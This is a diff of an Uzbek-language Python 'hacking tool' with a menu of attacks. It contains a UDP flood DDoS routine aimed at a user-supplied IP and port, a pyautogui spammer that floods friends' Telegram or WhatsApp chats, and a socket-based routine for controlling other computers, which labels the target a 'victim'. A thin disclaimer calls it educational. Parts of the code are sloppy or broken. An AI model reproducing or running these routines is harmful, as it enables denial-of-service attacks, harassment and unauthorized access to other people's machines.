@@ -1,60 +1,11 @@
-try:
-  import datetime as dt
-  import time
-  import platform
-  from art import tprint
-  import socket,os,time,random 
-  import pyautogui
-  import subprocess
-except ImportError:
-  print("Not installed Script packages..")
-  time.sleep(2)
-  print("Checking...")
-  
-  
-print(r"""
-___ ___ ___      _____     ___ ____ ___    ______      _____     _____       ____   ___
-|   |   |   |   | ____|   |   |    |   |   |   _ \     |  |\ \   |  ____|    |    | /  /
-|   |   |   |   | |____   |   |    |   |   |  | | \    |  | \ \  |  |        |    |/  /
-|   |___|   |   |____  |  |   |____|   |   |  | |  \   |  | / /  |  _____    |    |  /
-|   |___|   |        | |  |   |____|   |   |  | |  |   |  |/ /   |  _____|   |    |/ \
-|   |   |   |        | |  |   |    |   |   |  |/  /    |  |\ \   |  |        |    |\  \
-|   |   |   |	_____| |  |   |    |   |   |     /     |  | \ \  |  |_____   |    | \  \
-____    ____   ________|   ___      ____   |____/      |__| /_/  _________|  |____|  \__\
- """)  
-x = platform.system()
-print(f"Systema turi {x}")
+#Tuzuvchi Asadbek Abdubannopov
+#Yangilangan sana: 08/30/2023 10:41
 
-
-x = dt.datetime.now()
-# print(x)
-vaqt = dt.datetime.now()
-yil = x.year
-kun = x.strftime("%A")
-
-print(f"Hozirgi yil {yil}")
-print(f"Hozirgi soat {vaqt}")
-
-print("\n****************************************************************")
-print("\n* Cyber security,Android and telegram bot,SQLMap                *")
-print("\n* INSHAALLAX DATA SCIENST                                       *")
-print("\n* Asadbek Abdubannopov..  All rights reserved                   *")
-print("\n         [1] - DDOS hujum                                       *")
-print("\n         [2] - PING script                                      *")
-print("\n         [3] - Do'stlarni lol qoldirish                         *")
-print("\n         [4] - Boshqa kompyuterlarga ulanib boshqarish          *")
-print("\n****************************************************************")
-
-
-def tanla1():
-    print("Downloaded....")
-answer = int(input("Tanlang:  "))
-if answer == 1:
-    print("DDoS hujum tanlandi...")
-    time.sleep(5)
+def runddos():
+    import socket,os,time,random 
     os.system('cls')
-    os.system('clear')
-    print("DDOS tanlandi. Muvaffiqyatli")
+    
+    
     print("Bu o'quv maqsadida holos. Har kim qilayotgan ishiga o'zi javob beradi.\nSiz qilayotgan ishingizga dasturchi aybdor emas!")
     s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 
@@ -70,50 +21,37 @@ if answer == 1:
        s.sendto(packet,(ip,port))
        sent+=1
        print("--[#]-- DDOS HUJUM QILINYAPTI {} port - {} ip - {} Packetlar soni".format(port,ip,sent))
-if answer == 2:
-    os.system("cls")
-    os.system("clear")
-    print("PING script ishga tushdi.")    
-    ip_list = input("IP-ni kiriting\nMasalan: 192.168.1.1\n>>")
 
 
-    request = ConnectionError()
-    response = os.popen(f"Ping {ip_list}").read()
-    if request == response:
-        print("No internet connection")
-     
-    if "Reseived = 4" in response:
-        print(f"DOWN {ip_list} Ping reponse kelmayapti")
-    else:
-        print(f"Up {ip_list} Ping muvaffiqiyatli")
-        print(response)
-        print(request)
+def runping():
+    print("Xatolik yuz berdi! Yoki kodlar mavjud emas!")
 
-if answer == 3:
-    os.system('cls')
-    os.system('clear')
+def run_sms():
+    import pyautogui
+    import time
     print("Cheksiz so'zlar yozib do'stlaringizni lol qoldiring!")
     print("Ishlamoqda.....")
 
-    def sms_jonat():
-       xabar = input("Xabar yozing\n>>")
-       nechta = 10000
-       time.sleep(10)
+    
     xabar = input("Xabar yozing\n>>")
-    nechta = 10000
+    nechta = int(input("Necha marta takrorlansin>> "))
+    print("Tayyorlaning 10 sekund(Telegram, yoki WHatsappga kirib oling. Do'stingizni akkauntini tanlang. Mana sizga cheksiz so'zlar)")
+    print("Dasturni to'xtatish uchun (CTRL+C)")
+    time.sleep(10)
+    
     for i in range(nechta):
         pass
     while nechta > 0:
         nechta -=1
     
-        pyautogui.typewrite(xabar.strip())
-        pyautogui.press('enter')
-        
-    sms_jonat()        
-if answer == 4:
-    os.system('cls')
-    os.system('clear')
-    print("Ishga tushdi..")
+    pyautogui.typewrite(xabar.strip())
+    pyautogui.press('enter')
+
+
+def pc_attack():
+    import socket
+    import subprocess
+    import os
     server = socket.socket()
     host = str(input("Kompyuterdi IP sini yozing:  "))   ## shu kopni ip adresssi
     if OSError:
@@ -133,24 +71,88 @@ if answer == 4:
         server.send('Qurbon online holatda ->>>'.encode('UTF-8'))
 
 
-tanla1()
+
+def menu():
+    import datetime as dt
+    import time
+    import platform
+    from art import tprint
+    import socket,os,time,random 
+    import pyautogui
+    import subprocess
+    print(r"""
+___ ___ ___      _____     ___ ____ ___    ______      _____     _____       ____   ___
+|   |   |   |   | ____|   |   |    |   |   |   _ \     |  |\ \   |  ____|    |    | /  /
+|   |   |   |   | |____   |   |    |   |   |  | | \    |  | \ \  |  |        |    |/  /
+|   |___|   |   |____  |  |   |____|   |   |  | |  \   |  | / /  |  _____    |    |  /
+|   |___|   |        | |  |   |____|   |   |  | |  |   |  |/ /   |  _____|   |    |/ \
+|   |   |   |        | |  |   |    |   |   |  |/  /    |  |\ \   |  |        |    |\  \
+|   |   |   |	_____| |  |   |    |   |   |     /     |  | \ \  |  |_____   |    | \  \
+____    ____   ________|   ___      ____   |____/      |__| /_/  _________|  |____|  \__\
+ """)  
+    x = platform.system()
+    print(f"Systema turi {x}")
 
 
+    x = dt.datetime.now()
+    # print(x)
+    vaqt = dt.datetime.now()
+    yil = x.year
+    kun = x.strftime("%A")
+
+    print(f"Hozirgi yil {yil}")
+    print(f"Hozirgi soat {vaqt}")
+
+    print("\n****************************************************************")
+    print("\n         [1] - DDOS hujum                                       *")
+    print("\n         [2] - Internet tezligini o'lchash                      *")
+    print("\n         [3] - Do'stlarni lol qoldirish                         *")
+    print("\n         [4] - Boshqa kompyuterlarga ulanib boshqarish          *")
+    print("\n****************************************************************")
+
+    try:
+        ask_menu = int(input("Menu: "))
+        if ask_menu == 1:
+            runddos()
+        if ask_menu == 2:
+            runping()
+        if ask_menu == 3:
+            run_sms()
+        if ask_menu == 4:
+            pc_attack()
+        else:
+            print("Bunday raqamdagi menu mavjud emas!")
+
+    except ValueError:
+        print("Siz butun son kiritishingiz kerak!")
 
 
+def install_librarys():
+    import os
+    os.system('pip install art')
+    os.system('pip install pyautogui')
+    os.system('pip install subprocess')
+    os.system('pip install pyspeedtest')
+    os.system('pip install speedtest-cli')
 
 
+def check_module():
+    try:
+        import datetime as dt
+        import time
+        import platform
+        from art import tprint
+        import socket,os,time,random 
+        import pyautogui
+        import subprocess
+        import speedtest
 
+        menu()
 
-
-
-
-
-
-
-
-
-
-
-
-
+    except ImportError:
+        install_librarys()
+        print("Not installed Script packages..")
+         
+if __name__ == '__main__':
+    check_module()
+    
